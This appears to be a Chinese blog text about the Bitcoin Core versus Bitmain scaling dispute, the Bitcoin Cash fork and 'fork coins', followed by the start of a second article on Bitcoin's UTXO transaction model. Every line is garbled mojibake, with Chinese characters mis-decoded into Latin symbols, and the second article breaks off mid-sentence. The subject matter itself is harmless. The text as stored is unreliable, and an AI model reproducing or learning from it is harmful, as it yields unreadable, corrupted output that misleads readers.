<p><strong>Coreå›¢é˜Ÿ</strong>è¿™è¾¹å‘¢ï¼Ÿä»–ä»¬è¯´èµ·æ¥æ¯”è¾ƒåƒä¸€ç¾¤æå®¢ï¼Œ<strong>å¤šå¹´æ¥ç»´æŠ¤ç»´æŠ¤ç€æ¯”ç‰¹å¸è¿™ä¸ªå¼€æºé¡¹ç›®ï¼ŒåŒæ ·ä¹Ÿç»´æŠ¤è€…ä¸­æœ¬èªå½“å¹´å»ä¸­å¿ƒåŒ–çš„æ€æƒ³</strong>ã€‚æ‰€ä»¥Coreåœ¨å•†ä¸šå’ŒæŒ–çŸ¿æ–¹é¢å¹¶æ²¡æœ‰å¤ªå¤§å»ºæ ‘ï¼Œä½†æ˜¯<strong>åœ¨å›½å¤–çš„ç¤¾åŒºé‡Œä¸€ç›´æ‹¥æœ‰æé«˜çš„å£°èª‰</strong>ã€‚</p>
<p>ä»¥æ¯”ç‰¹å¤§é™†ä¸ºä»£è¡¨çš„å¤§çŸ¿å·¥ç¾¤ä½“ï¼Œå„æ–­äº†ç»å¤§å¤šæ•°ç®—åŠ›ã€‚è€Œå¼€å‘å›¢é˜ŸBitcoin Coreï¼Œåˆ™æ§åˆ¶äº†æ¯”ç‰¹å¸ä»£ç çš„æ›´æ–°æƒã€‚åŒæ–¹å›´ç»•ç€æ¯”ç‰¹å¸æ˜¯å¦éœ€è¦æ‰©å®¹çš„è¯é¢˜ï¼Œå±•å¼€äº†ä¸€è½®åˆä¸€è½®å£æ°´æˆ˜ã€‚</p>
<p>ç”±äºæ¯”ç‰¹å¤§é™†çš„åŠ›é‡è¶Šæ¥è¶Šå¤§ï¼Œæ¸æ¸å°±å½±å“åˆ°äº†æ¯”ç‰¹å¸æœªæ¥çš„å‘å±•è·¯çº¿ã€‚ä¸¤ä¸ªBOSSä¸€ä¸ªæ˜¯åœ¨æå®¢ä¸–ç•Œç»´æŠ¤ç€æ¯”ç‰¹å¸ä»£ç å’Œå»ä¸­å¿ƒåŒ–æ€æƒ³ï¼Œè€Œå¦ä¸€ä¸ªåˆ™æ˜¯å¸¦æœ‰éå¸¸æµ“åšçš„å•†ä¸šè¡Œä¸ºçš„å…¬å¸ã€‚ä¸¤è€…éš¾å…åœ¨ä¸€äº›äº‹æƒ…ä¸Šå£°éŸ³ä¸åŒã€‚</p>
<p>BCHï¼ˆæ¯”ç‰¹ç°é‡‘ï¼‰ï¼Œè¿™æ˜¯é•¿è¾¾ä¸‰å¹´æ‰©å®¹äº‰è®®çš„äº§ç‰©ï¼Œæ˜¯ä»¥çŸ¿éœ¸æ¯”ç‰¹å¤§é™†ä¸ºæ ¸å¿ƒä¸»å¯¼çš„ä¸€æ¬¡åˆ†å‰ï¼Œå¯¼è‡´æ¯”ç‰¹å¸ç¤¾åŒºåœ¨2017å¹´ä¸‹åŠå¹´åˆ†è£‚ã€‚åœ¨æ¯”ç‰¹å¸ç½‘ç»œæ‹¥å µçš„èƒŒæ™¯ä¸‹ï¼Œæ¯”ç‰¹ç°é‡‘ä¸»å¼ èµ°å¤§åŒºå—è·¯çº¿ï¼Œå·ç§°æœ‰æ›´é«˜æ€§èƒ½ï¼Œæ›´é«˜çš„å®¹é‡ï¼Œæ›´ä½çš„äº¤æ˜“æ‰‹ç»­è´¹ç”¨ï¼Œæ­£å¼å’Œæ¯”ç‰¹å¸å±•å¼€ç«äº‰ã€‚</p>
<p>ç«äº‰åˆæœŸï¼Œå› ä¸ºæœ‰ä»¥æ¯”ç‰¹å¤§é™†ä¸ºä»£è¡¨çš„å¤§çŸ¿å·¥ç¾¤ä½“æ”¯æŒï¼Œæ¯”ç‰¹ç°é‡‘ä¼¼ä¹çœ‹èµ·æ¥æœ‰è¶Šä½æ¯”ç‰¹å¸ä¹‹åŠ¿ï¼Œå…¶å…‘æ¢æ¯”ç‰¹å¸çš„æ¯”ä¾‹ä¸€åº¦è¾¾åˆ°0.4ï¼ˆ1ä¸ªæ¯”ç‰¹å¸ç°é‡‘å¯ä»¥å…‘æ¢åˆ°0.4æ¯”ç‰¹å¸ï¼‰ã€‚</p>
<p>BCHè¯ç”Ÿæ—¶ï¼Œå¸å¸‚ä»å¤„ç‰›å¸‚ã€‚åˆ†å‰å¸¦æ¥çš„ææ…Œï¼Œå¾ˆå¿«ä¾¿è¢«ç‰›å¸‚çš„ç‹‚çƒ­æ‰€æ·¹æ²¡ã€‚è€ŒBSVåˆ†å®¶æ—¶ï¼Œå¸åœˆæ­£å€¼ç†Šå¸‚â€”â€”ä¸€ä¸ªæœˆæ—¶é—´ï¼ŒBCHå¸ä»·ç”±åˆ†å‰å‰çš„552ç¾å…ƒï¼Œä¸€è·¯ç‹‚æ³»è‡³74ç¾å…ƒï¼Œè·Œå»83%ã€‚å³ä¾¿è®¡å…¥åˆ†å‰åäº§ç”Ÿçš„BSVï¼ŒæŠ•èµ„è€…ä¾ç„¶æŸå¤±æƒ¨é‡ã€‚</p>
<h4 id="åˆ†å‰å¸"><a href="#åˆ†å‰å¸" class="headerlink" title="åˆ†å‰å¸"></a>åˆ†å‰å¸</h4><p>è±ç‰¹å¸ã€ç‹—ç‹—å¸è¿™äº›ç«äº‰å¸ç§ï¼Œéƒ½æ˜¯ç‹¬ç«‹å»ºç«‹æ•°æ®ï¼Œå’Œæ¯”ç‰¹å¸åˆ†ç¦»ã€‚è€ŒBCHã€BTGã€BCDå’Œæ¯”ç‰¹å¸å…±ç”¨æŸä¸ªæ—¶é—´èŠ‚ç‚¹ä¹‹å‰çš„æ•°æ®ï¼Œä¸¤è€…çš„æœ¬è´¨å·®åˆ«åœ¨è¿™ï¼Œå…±ç”¨æ•°æ®å¯¼è‡´ï¼ŒæŸä¸ªæ—¶é—´èŠ‚ç‚¹ä¹‹å‰æŒå¸çš„ç”¨æˆ·ï¼Œè‡ªåŠ¨åŒæ—¶æŒæœ‰ä¸¤ç§å¸ã€‚å› ä¸ºç”¨æˆ·å…³æ³¨çš„æ˜¯æŒå¸é—®é¢˜ï¼Œæ‰€ä»¥å‰è€…ä¸è¢«ç§°ä¸ºåˆ†å‰å¸ï¼Œè€Œåè€…è¢«ç§°ä¸ºåˆ†å‰å¸ã€‚é™¤äº†æ¯”ç‰¹å¸ï¼Œä»¥å¤ªåŠETHç›®å‰ä¹Ÿæœ‰ä¸€ç§åˆ†å‰å¸å­˜åœ¨ï¼Œå³ETCã€‚</p>
<p>åˆ†å‰å¸ä»è½¯ä»¶æŠ€æœ¯ä¸Šï¼Œâ€œå¤åˆ¶å¹¶ä¿®æ”¹â€ï¼Œä¿®æ”¹ä¸€è¡Œä»£ç ä¹Ÿæ˜¯ä¿®æ”¹ï¼Œä¿®æ”¹100è¡Œä»£ç ä¹Ÿæ˜¯ä¿®æ”¹ï¼Œæœ¬è´¨ä¸Šæ˜¯ä¸€ä¸ªæ„æ€ã€‚ä»æŠ€æœ¯ä¸Šçœ‹ï¼Œä¸å­˜åœ¨æ­£å®—ä¸æ­£å®—çš„é—®é¢˜ã€‚</p>
<p>åŒæ ·æ˜¯ç¡¬åˆ†å‰ï¼Œå¦å¤–ä¸€ç§æƒ…å†µï¼ŒBç‰ˆæœ¬å¾—åˆ°å¹¿æ³›æ”¯æŒï¼Œè€ŒAç‰ˆæœ¬è¢«å¤§é¢ç§¯åœç”¨ï¼Œé‚£ä¹ˆBç‰ˆæœ¬å°±ä¼šç»§æ‰¿è¿™ä¸ªå¸ç§æ­£å®—çš„ç§°å·ï¼Œè€ŒAç‰ˆæœ¬åè€Œä¼šè¢«æ”¹åæ¢å§“å«å¦å¤–ä¸€ä¸ªåå­—ï¼Œè¿™éƒ½æ˜¯çº¦å®šæˆä¿—çš„ï¼Œæ²¡æœ‰ä¸€ä¸ªä¸­å¿ƒåŒ–çš„è§„å®šã€‚æ¯”å¦‚ä»¥å¤ªåŠETHç¡¬åˆ†å‰åï¼Œä½œä¸ºæ–°ç‰ˆæœ¬çš„Bç‰ˆæœ¬è¿˜æ˜¯è¢«å¤§å®¶ç§°ä¸ºETHï¼Œè€ŒAç‰ˆæœ¬è¢«å¤§å®¶æ”¹ç§°ä¸ºETCã€‚</p>
<p>åœ¨Aç‰ˆæœ¬ä»ç„¶å¾—åˆ°ç»å¤§éƒ¨åˆ†æ”¯æŒçš„æƒ…å†µä¸‹ï¼Œä¸Šé¢çš„B1ã€B2ã€B3ç‰ˆæœ¬ä¸ºä»€ä¹ˆèƒ½æ´»ï¼Ÿä¹Ÿæ˜¯åŸºäºç›¸åŒçš„è¿™ä¸¤ç‚¹å‰æï¼Œç¬¬ä¸€ç‚¹ï¼Œè¿™äº›ä¸€å°æ’®äººæçš„Bç‰ˆæœ¬ï¼Œç»Ÿç»Ÿä¿®æ”¹äº†éš¾åº¦ç³»æ•°å’Œç®—æ³•ï¼Œæ‰€ä»¥ä¸ä¼šåä¸‡åˆ†é’Ÿæ‰å‡ºå—æ•°æ®ï¼›ç¬¬äºŒç‚¹ï¼Œè¿™ä¸€å°æ’®äººæŠ€æœ¯è™½ç„¶éƒ½æ˜¯æŠ„çš„ï¼Œä½†æ˜¯ä»–ä»¬ä¸“æ³¨åšäº†ä¸€ç³»åˆ—çš„å¸‚åœºæ¨å¹¿ï¼Œä¸Šçº¿äº¤æ˜“æ‰€ç­‰ç­‰ã€‚</p>
<p>ç°åœ¨åˆ†å‰å°±å˜æˆäº†å››ç§æƒ…å†µï¼ˆç»“æœï¼‰ï¼š</p>
<p>1ã€Aç‰ˆæœ¬ä»ç„¶è¢«å¹¿æ³›æ”¯æŒï¼ŒBç‰ˆæœ¬ç®—åŠ›ä¸è¶³æ¶ˆäº¡ï¼Œåªä¿ç•™Aç‰ˆæœ¬ã€‚</p>
<p>2ã€Bç‰ˆæœ¬è¢«å¹¿æ³›æ”¯æŒï¼ŒAç‰ˆæœ¬ç®—åŠ›ä¸è¶³æ¶ˆäº¡ï¼Œåªä¿ç•™Bç‰ˆæœ¬ã€‚</p>
<p>3ã€Aç‰ˆæœ¬å’ŒBç‰ˆæœ¬éƒ½æœ‰ç›¸å½“ä¸€éƒ¨åˆ†æ”¯æŒï¼ŒåŒæ—¶å¹¶å­˜ã€‚è¿™ç§æƒ…å†µæ˜¯æœ€ç¬¦åˆä¸¥æ ¼æ„ä¹‰ä¸Šçš„ç¡¬åˆ†å‰ã€‚è¿™ä¸¤è€…æ˜¯è´§çœŸä»·å®çš„åˆ†å‰å¸ã€‚æœ‰ä¸€å®šçš„é—¨æ§›ï¼ˆæ”¯æŒç‡ï¼‰ã€‚åˆ°ç›®å‰ä¸ºæ­¢æ¯”ç‰¹å¸æ²¡æœ‰ä¸€ç§è¿™ç§åˆ†å‰å¸äº§ç”Ÿã€‚</p>
<p>4ã€Aç‰ˆæœ¬ä»ç„¶è¢«å¹¿æ³›æ”¯æŒï¼ŒBç‰ˆæœ¬é€šè¿‡ä»£ç ä¿®æ”¹éš¾åº¦ç³»æ•°å’Œç®—æ³•ï¼Œä¸€å°æ’®äººä¹Ÿèƒ½å¤Ÿè®©å®ƒå­˜æ´»ä¸‹æ¥ã€‚è¿™ç§Bç‰ˆæœ¬çš„åˆ†å‰å¸æ˜¯å‡ ä¹æ²¡æœ‰é—¨æ§›çš„ï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œè¿™ç§åˆ†å‰å¸å‡ ä¸ªæœˆå†…å°±å‡ºæ¥ä¸‰äº”ç§ï¼Œè€Œä¸”å¥½åƒè¿˜åœ¨ä¸æ–­å¢åŠ ï¼ˆæœ‰åˆ©å¯å›¾ï¼‰ã€‚å¤§éƒ¨åˆ†ç†è§£æ¯”ç‰¹å¸çš„äººï¼ŒæŠŠè¿™ä¸€ç±»åˆ†å‰è·Ÿå…¶ä»–ä¸€åƒå¤šç§ç«äº‰å¸è¿›è¡Œç­‰åŒçœ‹å¾…ï¼Œåœ¨å›½å¤–çš„ä¸€äº›äº¤æ˜“æ‰€æŠŠBCHç§°ä¸ºbcashå¸è€Œä¸æ˜¯bitcoin cashã€‚</p>
<p>æ ¹æ®è™å—…ç½‘çš„æŠ¥é“ï¼Œ</p>
<p><a href="https://www.huxiu.com/article/311309.html">æ¯”ç‰¹å¸åˆ†å‰å¾€äº‹</a></p>
<blockquote>
<p>2018å¹´1æœˆ13æ—¥ï¼Œæ¯”ç‰¹å¸å¸‚å€¼å æ•´ä¸ªåŠ å¯†å¸å¸‚åœºçš„ä»½é¢è·Œè‡³32.45%ï¼Œåˆ›ä¸‹å†å²æ–°ä½ã€‚å½“æ—¶å¾ˆå¤šäººéƒ½ä»¥ä¸º<strong>æ¯”ç‰¹å¸è¢«å–ä»£æ˜¯æ—©æ™šçš„äº‹</strong>ã€‚<br>å¯¹äºå´å¿Œå¯’æ¥è¯´ï¼Œç®—åŠ›æ˜¯æœ€å¤§çš„ä¼˜åŠ¿å’Œæ­¦å™¨ï¼Œä»–å¸Œæœ›ä»–ä¸»å¯¼çš„åˆ†å‰å¸BCHèƒ½å¤Ÿå–ä»£BTCã€‚<br>ä½†BTCå æ®äº†æ¯”ç‰¹å¸çš„æ­£ç»ŸåŠå† åæƒï¼Œè¿˜æœ‰9å¹´ç”¨æˆ·ç´¯ç§¯ä¸è¡Œä¸šç”Ÿæ€ã€‚<strong>BCHè¯ç”Ÿä¹‹åï¼Œä¸€ç›´é¢ä¸´ç€ä¸€ä¸ªä¸¥å³»çš„æŒ‘æˆ˜ï¼Œå°±æ˜¯æ²¡æœ‰äººè®¤å¯ã€‚</strong><br>å†åŠ ä¸ŠBitcoin Coreé˜µè¥çš„åå¯¹å’Œå¤§éƒ¨åˆ†è¡Œä¸šå…¬å¸ä¿æŒè§‚æœ›ä¸­ç«‹ï¼Œåœ¨BTCåˆ†å‰åï¼Œå¤§éƒ¨åˆ†BCHè¢«ç”¨æˆ·å½“æˆç³–æœæŠ›å”®ï¼ŒBCHä»·æ ¼åˆšå‡ºæ¥åªæœ‰200å¤šç¾å…ƒã€‚<br>åˆ†å‰åï¼Œ<strong>å´å¿Œå¯’ä¸€æ–¹é¢é€šè¿‡æ‹‰é«˜BCHä»·æ ¼å¸å¼•çŸ¿å·¥è¿‡æ¥æŒ–BCHï¼Œå¦ä¸€æ–¹é¢ä¸æ–­æŠ›å”®BTCï¼Œé€ æˆBTCä»·æ ¼ä¸ç¨³å®š</strong>ï¼Œæœ€ç»ˆï¼šâ€œå¾ˆå¤šçŸ¿å·¥å°±ä¼šé€‰æ‹©ç»§ç»­æŒ–BCHï¼Œä»è€Œå¯¼è‡´æ¯”ç‰¹å¸ç®—åŠ›å‡å°‘ï¼Œç½‘ç»œæ›´åŠ æ‹¥å µï¼Œæ›´å¤šäººä¿¡å¿ƒä¸§å¤±æŠ›å”®æ¯”ç‰¹å¸ï¼Œæœ€åçŸ¿å·¥æ›´åŠ è½¬ç§»åˆ°BCHï¼Œå½¢æˆæ¶æ€§å¾ªç¯ï¼Œå¯¼è‡´æ¯”ç‰¹å¸çš„å´©ç›˜â€ã€‚<br>äºæ˜¯å´å¿Œå¯’ç¬¬ä¸€æ¬¡è¿›æ”»é€‰æ‹©äº†æ‹‰ç›˜ã€‚<strong>BCHçš„ä»·æ ¼ä¸€è·¯èµ°é«˜ï¼Œåˆ†å‰åä¸åˆ°äºŒåå¤©ï¼Œ8æœˆ20å·ä»·æ ¼å°±çŒ›æ¶¨åˆ°898ç¾å…ƒï¼Œç¿»äº†ä¸‰å€å¤š</strong>ã€‚çŸ¿å·¥ä»¬çœ‹åˆ°BCHæœ‰åˆ©å¯å›¾ï¼Œå†åŠ ä¸ŠBTCçš„ç®—åŠ›ç¼©å°ï¼Œäº¤æ˜“æ›´æ‹¥å µï¼›è¶Šæ¥è¶Šå¤šçš„äººå¼€å§‹è½¬æŠ•BCHï¼Œè€Œè¿™è¿›ä¸€æ­¥å¯¼è‡´BCHä»·æ ¼å‡æ ¼ï¼Œå°±è¿™æ ·ä¸æ–­å¾ªç¯ï¼ŒBCHä»·æ ¼ä¸€è·¯èµ°é«˜ã€‚<br>æ¥ç€å´å¿Œå¯’ç¬¬äºŒæ¬¡è¿›æ”»å¼€å§‹æŠ¢å¤ºæ¯”ç‰¹å¸çš„ç®—åŠ›ã€‚æç«¯æƒ…å†µä¸‹ï¼ŒBCHåˆ†æµäº†BTCçš„æ¥è¿‘ä¸€åŠçš„ç®—åŠ›ï¼Œè®©æ¯”ç‰¹å¸é“¾ä¸Šçš„äº¤æ˜“å¤§å¹…æ‹¥å µã€‚ç„¶è€Œåœ¨11æœˆï¼ŒBCHç®—åŠ›è¾¾åˆ°äº†BTCçš„ä¸¤å€ï¼Œä»·æ ¼ä»åªæœ‰æ¯”ç‰¹å¸çš„ä¸‰åˆ†ä¹‹ä¸€ï¼Œæœ€åBCHç®—åŠ›è¿…é€Ÿå´©æºƒå†ä¹Ÿæ²¡è¶…è¿‡æ¯”ç‰¹å¸ã€‚</p>
</blockquote>
<h1 id="åŒºå—é“¾æŠ€æœ¯7-æ¯”ç‰¹å¸çš„æœºåˆ¶-1"><a href="#åŒºå—é“¾æŠ€æœ¯7-æ¯”ç‰¹å¸çš„æœºåˆ¶-1" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯7:æ¯”ç‰¹å¸çš„æœºåˆ¶(1)"></a>åŒºå—é“¾æŠ€æœ¯7:æ¯”ç‰¹å¸çš„æœºåˆ¶(1)</h1><p>æ¯”ç‰¹å¸çš„å…±è¯†æœºåˆ¶ç”Ÿæˆäº†ä¸€ä¸ªappend-onlyçš„è´¦æœ¬ï¼Œä¸€æ—¦äº¤æ˜“åœ¨è´¦æœ¬ä¸­ï¼Œå†ä¹Ÿä¸èƒ½æ›´æ”¹ã€‚çŸ¿å·¥â€”â€”ä¹Ÿå³ä¸€äº›æœ‰è¾ƒé«˜è®¡ç®—åŠ›çš„èŠ‚ç‚¹ï¼Œç”ŸæˆåŒºå—ï¼Œå¹¶ä¸”éªŒè¯äº¤æ˜“æ˜¯æ­£ç¡®çš„ï¼ˆç­¾åæ˜¯æ­£ç¡®çš„ã€å¸æ²¡æœ‰é‡å¤èŠ±è´¹ï¼‰ç­‰ã€‚è´¦æœ¬å’ŒåŒºå—é“¾ç½‘ç»œä½¿å¾—æ¯”ç‰¹å¸æˆä¸ºä¸€ç§è´§å¸ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œå°†ä»‹ç»ä¸€äº›ç»†èŠ‚ã€‚</p>
<h2 id="äº¤æ˜“"><a href="#äº¤æ˜“" class="headerlink" title="äº¤æ˜“"></a>äº¤æ˜“</h2><p>åŒºå—é“¾å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªè´¦æœ¬ï¼Œè´¦æœ¬å°±æ˜¯è¦è®°è´¦ï¼Œè´¦å®é™…å°±æ˜¯ä¸€ç¬”ç¬”çš„äº¤æ˜“ã€‚é‚£é¦–å…ˆçœ‹ä¸€ä¸‹ï¼Œä½¿ç”¨ä¸‹é¢çš„è®°è´¦å½¢å¼æ•ˆæœå¦‚ä½•ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233002.jpg" alt="img"></p>
<p>ç¬¬ä¸€ä¸ªäº¤æ˜“æ˜¯å½¢æˆåŒºå—çš„å¥–åŠ±25ä¸ªæ¯”ç‰¹å¸ã€‚Aliceå°†17ä¸ªå¸è½¬ç»™Bobï¼ŒBobè½¬8ä¸ªç»™Carolï¼ŒCarolè½¬5ä¸ªç»™Aliceï¼Œç„¶åAliceè½¬15ä¸ªç»™Davidã€‚è¿™ç§è®°è´¦æ–¹å¼éå¸¸ç¬¦åˆæˆ‘ä»¬çš„ç›´è§‰ï¼Œå› ä¸ºç°å®ç”Ÿæ´»ä¸­ï¼Œæ”¯ä»˜å®ã€å¾®ä¿¡ã€é“¶è”éƒ½æ˜¯è¿™ä¹ˆåšçš„ã€‚ä½†æ˜¯è¿™ç§åšæ³•çš„ä¼˜ç¼ºç‚¹æ˜¯ä»€ä¹ˆï¼Ÿ</p>
<p>ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå‰é¢çš„å‡ ç¬”äº¤æ˜“æˆ‘ä»¬å¯èƒ½éƒ½çœ‹çš„å¾ˆé¡ºï¼Œå› ä¸ºæ ¹æ®ä¹‹å‰äº¤æ˜“çš„æƒ…å†µï¼Œæˆ‘ä»¬å¾ˆå®¹æ˜“åˆ¤æ–­å‡ºäº¤æ˜“èƒ½å¤Ÿé¡ºåˆ©è¿›è¡Œã€‚ä½†æ˜¯çœ‹åˆ°æœ€åä¸€ç¬”äº¤æ˜“çš„æ—¶å€™å°±å¾—æƒ³ä¸€ä¸‹ï¼ŒAliceæœ‰è¿™ä¹ˆå¤šé’±æ”¯ä»˜ç»™Davidå—ï¼Ÿ</p>
<p>è¿™ç§å½¢å¼çš„è´¦æœ¬ä¹Ÿå«ä½œaccount-basedè´¦æœ¬ï¼Œè¿™ç§è®°è´¦æ–¹å¼çš„é—®é¢˜æ˜¯ï¼šå¿…é¡»å¯¹æ¯ä¸ªè´¦æˆ·çš„ä½™é¢è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰èƒ½ç¡®å®šä¸€ç¬”äº¤æ˜“æ˜¯å¦æœ‰æ•ˆã€‚è­¬å¦‚åœ¨æœ€åä¸€ä¸ªäº¤æ˜“çš„æ—¶å€™ï¼Œå¾—å»æŸ¥ä¸€ä¸‹Aliceçš„è´¦æˆ·ï¼Œæ€»å…±è¿˜æœ‰å¤šå°‘å¸å‰©ä½™ã€‚åƒä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œå¦‚æœæ²¡æœ‰å…¨å±€çš„æ•°æ®ç»“æ„ç»´æŠ¤ç”¨æˆ·çš„ä½™é¢ï¼Œé‚£ä¹ˆå¯èƒ½å¾—ä¸€è·¯è¿½è¸ªå›å»åˆ°èµ·å§‹äº¤æ˜“ï¼Œçœ‹çœ‹Aliceåˆ°åº•å‰©å¤šå°‘é’±ã€‚å¦‚æœæƒ³è¦å¿«ä¸€ç‚¹ï¼Œé‚£å°±å¾—é¢å¤–åœ°ç»´æŠ¤æ•°æ®ç»“æ„ï¼Œè­¬å¦‚æœ‰ä¸€ä¸ªå…¨å±€çš„æ•°æ®ç»“æ„ï¼Œåœ¨æ¯æ¬¡äº¤æ˜“åæ›´æ–°è´¦æˆ·ä½™é¢ã€‚</p>
<p>ç”±äºè¿™æ ·çš„é—®é¢˜ï¼Œæ¯”ç‰¹å¸å¹¶æ²¡æœ‰ä½¿ç”¨è¿™æ ·account-basedçš„è®°è´¦æ–¹æ³•ã€‚æ¯”ç‰¹å¸çš„è®°è´¦æ–¹å¼æ˜¯ç±»ä¼¼äºè¿™æ ·çš„ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233003.jpg" alt="img"></p>
<p>æ¯ä¸€ç¬”äº¤æ˜“æŒ‡æ˜äº†è¾“å…¥å’Œè¾“å‡ºï¼Œæ¯ä¸€ç¬”äº¤æ˜“æœ‰å”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œæ¯ä¸€ç¬”äº¤æ˜“å¯ä»¥æœ‰å¤šä¸ªè¾“å…¥å’Œå¤šä¸ªè¾“å‡ºã€‚ä¸Šé¢çš„ä¾‹å­åšäº†ç®€åŒ–ï¼Œä½¿å¾—å¯ä»¥æ–¹ä¾¿åœ°ä½¿ç”¨åºå·æ¥æŒ‡ä»£äº¤æ˜“ã€‚</p>
<p>ç¬¬ä¸€ä¸ªäº¤æ˜“ä¸­æ²¡æœ‰è¾“å…¥ï¼Œå› ä¸ºå®ƒæ˜¯åŒºå—çš„ç¬¬ä¸€ä¸ªäº¤æ˜“ï¼Œåˆ›é€ äº†æ–°çš„å¸ï¼ŒAliceä½œä¸ºçŸ¿å·¥è·å¾—äº†å¸ï¼Œè¿™25ä¸ªå¸ä¹Ÿæ˜¯äº¤æ˜“1çš„å”¯ä¸€ä¸€ä¸ªè¾“å‡ºï¼Œåœ¨ä¹‹åä½¿ç”¨1[0]æ¥æŒ‡ä»£Aliceæ‹¥æœ‰çš„25ä¸ªå¸ã€‚åœ¨ç¬¬äºŒä¸ªäº¤æ˜“ä¸­ï¼Œè¾“å…¥æ˜¯1[0]ï¼Œ25ä¸ªå¸ï¼Œç„¶åäº§ç”Ÿäº†ä¸¤ä¸ªè¾“å‡ºï¼Œ2[0]æ˜¯æ”¯ä»˜ç»™Bobçš„17ä¸ªå¸ï¼Œ2[1]æ˜¯å‰©ä¸‹çš„8ä¸ªå¸ï¼Œä¹Ÿå½¢æˆäº†ä¸€ä¸ªè¾“å‡ºï¼Œæ¥æ”¶æ–¹æ˜¯Aliceè‡ªå·±ã€‚åœ¨ç¬¬ä¸‰ä¸ªäº¤æ˜“ä¸­è¾“å…¥æ˜¯2[0]ï¼Œä¹Ÿå³Bobçš„17ä¸ªå¸ï¼Œè¾“å‡ºæ˜¯3[0]ï¼Œä»˜ç»™Carolçš„8ä¸ªå¸ï¼Œä»¥åŠ3[1]ï¼Œä»˜ç»™Bobçš„9ä¸ªå¸ã€‚åœ¨ç¬¬å››ä¸ªäº¤æ˜“ä¸­ï¼Œè¾“å…¥æ˜¯2[1]ï¼Œä¹Ÿå³Aliceçš„8ä¸ªå¸ï¼Œåˆ†åˆ«æ”¯ä»˜ç»™Davidå’ŒAliceã€‚</p>
<p>ä½¿ç”¨è¿™æ ·çš„è®°è´¦æ–¹å¼çš„å¥½å¤„æ˜¯å¯ä»¥æ–¹ä¾¿åœ°éªŒè¯äº¤æ˜“çš„æ­£ç¡®æ€§ã€‚åœ¨éªŒè¯ä¸€ä¸ªäº¤æ˜“æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°è¾“å…¥æ‰€æŒ‡å‘çš„äº¤æ˜“çš„è¾“å‡ºï¼ŒåŒæ—¶ä¸ºäº†ç¡®ä¿å®ƒå¹¶æ²¡æœ‰è¢«èŠ±æ‰ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰«ææ‰€æŒ‡å‘çš„äº¤æ˜“åŒºå—å’Œæœ€æ–°åŒºå—ä¹‹é—´æ‰€æœ‰çš„åŒºå—ï¼Œè€Œä¸éœ€è¦æ‰¾åˆ°åˆ›ä¸–åŒºå—ã€‚</p>
<p>å› ä¸ºä¸€ä¸ªäº¤æ˜“å¯ä»¥åŒ…æ‹¬å¤šä¸ªè¾“å…¥å’Œå¤šä¸ªè¾“å‡ºï¼Œæ‰€ä»¥å¯ä»¥æ–¹ä¾¿åœ°å®ç°å„ç§ç›®çš„ã€‚è­¬å¦‚ï¼ŒBobæ¥æ”¶åˆ°Aliceçš„8ä¸ªå¸ï¼Œæ”¶åˆ°Carolçš„2ä¸ªå¸ï¼Œé‚£ä¹ˆBobå¯ä»¥å°†åˆ›å»ºä¸€ä¸ªæ–°çš„äº¤æ˜“ï¼Œå°†ä¸¤ä¸ªäº¤æ˜“ä¸­çš„è¾“å‡ºä½œä¸ºè¾“å…¥ï¼Œä»è€Œå°†é›¶é’±åˆå¹¶ä¸ºæ•´é’±ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233004.jpg" alt="img"></p>
<p>å¦‚æœBobå’ŒCarolè¦åŒæ—¶æ”¯ä»˜ç»™Davidï¼Œé‚£ä¹ˆåœ¨åŒä¸€ä¸ªäº¤æ˜“ä¸­çš„è¾“å…¥å¯ä»¥åŒ…å«Bobå’ŒCarolçš„å¸ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ äº¤æ˜“ç”Ÿæ•ˆçš„æ¡ä»¶åŒæ—¶éœ€è¦Bobå’ŒCarolä¸¤äººçš„ç­¾åã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233005.jpg" alt="img"></p>
<h2 id="äº¤æ˜“çš„è¯­æ³•"><a href="#äº¤æ˜“çš„è¯­æ³•" class="headerlink" title="äº¤æ˜“çš„è¯­æ³•"></a>äº¤æ˜“çš„è¯­æ³•</h2><p>ä¸Šé¢ä»æ¦‚å¿µä¸Šç®€å•ä»‹ç»äº†äº¤æ˜“ã€‚æ¥ä¸‹æ¥çœ‹ä¸€äº›ç»†èŠ‚â€”â€”ä¸‹é¢çš„å›¾è™½ç„¶ä¸€çœ¼çœ‹ä¸Šå»æœ‰ç‚¹å¤æ‚ï¼Œä½†æ˜¯å·²ç»æ˜¯ç»è¿‡ç¿»è¯‘ä¹‹åçš„å‹å¥½ç‰ˆæœ¬ï¼Œæ¯•ç«Ÿæ‰€æœ‰åœ¨ç½‘ç»œä¸Šä¼ è¾“çš„æ•°æ®éƒ½æ˜¯01ä¸²ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233006.jpg" alt="img"></p>
<p>hashæ˜¯ä¸Šä¸€ç¬”</p>
<p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œäº¤æ˜“ç”±ä¸‰éƒ¨åˆ†æ„æˆï¼šå…ƒæ•°æ®ã€è¾“å…¥ï¼ˆå¤šä¸ªï¼‰å’Œè¾“å‡ºï¼ˆå¤šä¸ªï¼‰ã€‚</p>
